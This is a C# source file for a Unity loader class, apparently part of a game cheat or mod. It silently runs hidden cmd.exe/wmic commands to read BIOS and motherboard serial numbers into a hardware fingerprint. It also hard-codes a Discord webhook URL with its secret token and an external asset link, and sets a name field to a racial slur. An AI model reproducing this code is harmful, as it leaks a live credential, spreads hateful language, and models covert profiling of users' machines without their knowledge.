// https://github.com/aerodakdev && https://github.com/San3lka
// Current=> Load.Loadc
// <3

using kaka;
using System;
using System.Diagnostics;
using System.Text.RegularExpressions;
using UnityEngine;

#nullable disable
namespace Load
{
  public class Loadc
  {
    public static GameObject obj;
    public static string Version = "";
    public static string Name = "";
    public static string Discord = "";
    public static int Gün = 0;
    public static string Licancee = "";
    public static string HLink = "";
    public static string AssetLink = "";
    public static string DesktopYol = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    public static string AppdatYol = Environment.ExpandEnvironmentVariables("%appdata%");
    public static string TempYol = Environment.ExpandEnvironmentVariables("%temp%");

    public static string H()
    {
      string str1 = "";
      Process process1 = new Process();
      process1.StartInfo.FileName = "cmd.exe";
      process1.StartInfo.Arguments = "/c wmic bios get SMBIOSBIOSVersion";
      process1.StartInfo.UseShellExecute = false;
      process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process1.StartInfo.RedirectStandardOutput = true;
      process1.StartInfo.CreateNoWindow = true;
      process1.Start();
      string str2 = Regex.Match(process1.StandardOutput.ReadToEnd().Replace("SMBIOSBIOSVersion", ""), "\\d+").Value;
      process1.WaitForExit();
      Process process2 = new Process();
      process2.StartInfo.FileName = "cmd.exe";
      process2.StartInfo.Arguments = "/c wmic bios get ReleaseDate";
      process2.StartInfo.UseShellExecute = false;
      process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process2.StartInfo.RedirectStandardOutput = true;
      process2.StartInfo.CreateNoWindow = true;
      process2.Start();
      string str3 = Regex.Match(process2.StandardOutput.ReadToEnd(), "\\d+").Value;
      process2.WaitForExit();
      Process process3 = new Process();
      process3.StartInfo.FileName = "cmd.exe";
      process3.StartInfo.Arguments = "/c wmic bios get Version";
      process3.StartInfo.UseShellExecute = false;
      process3.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process3.StartInfo.RedirectStandardOutput = true;
      process3.StartInfo.CreateNoWindow = true;
      process3.Start();
      string str4 = Regex.Match(process3.StandardOutput.ReadToEnd(), "\\d+").Value;
      process3.WaitForExit();
      Process process4 = new Process();
      process4.StartInfo.FileName = "cmd.exe";
      process4.StartInfo.Arguments = "/c wmic bios get IdentificationCode";
      process4.StartInfo.UseShellExecute = false;
      process4.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process4.StartInfo.RedirectStandardOutput = true;
      process4.StartInfo.CreateNoWindow = true;
      process4.Start();
      string str5 = Regex.Match(process4.StandardOutput.ReadToEnd(), "\\d+").Value;
      process4.WaitForExit();
      Process process5 = new Process();
      process5.StartInfo.FileName = "cmd.exe";
      process5.StartInfo.Arguments = "/c wmic baseboard get serialnumber";
      process5.StartInfo.UseShellExecute = false;
      process5.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process5.StartInfo.RedirectStandardOutput = true;
      process5.StartInfo.CreateNoWindow = true;
      process5.Start();
      string str6 = Regex.Match(process5.StandardOutput.ReadToEnd(), "\\d+").Value;
      process5.WaitForExit();
      if (!string.IsNullOrEmpty(str2))
        str1 += str2;
      if (!string.IsNullOrEmpty(str3))
        str1 += str3;
      if (!string.IsNullOrEmpty(str4))
        str1 += str4;
      if (!string.IsNullOrEmpty(str5))
        str1 += str5;
      if (!string.IsNullOrEmpty(str6))
        str1 += str6;
      return "DarkNight-" + str1.Replace("0", "");
    }

    public static void Loadv()
    {
      Loadc.Name = "nigger";
      Loadc.Gün = 1337;
      Loadc.HLink = "https://discord.com/api/webhooks/1309023666679451689/dwpeYEqCgj5rQMTGXLKY7Gn5nv-BqR7utTbDjtIlFlMd84t8JMHAg5_bEpiXoqV9H7Kg";
      Loadc.AssetLink = "https://redlight-portal.cz/solix";
      Debug.Log((object) "You can download and upload to your cloud");
      Loadc.obj = new GameObject();
      Object.DontDestroyOnLoad((Object) Loadc.obj);
      Loadc.obj.AddComponent<Manager>();
    }
  }
}
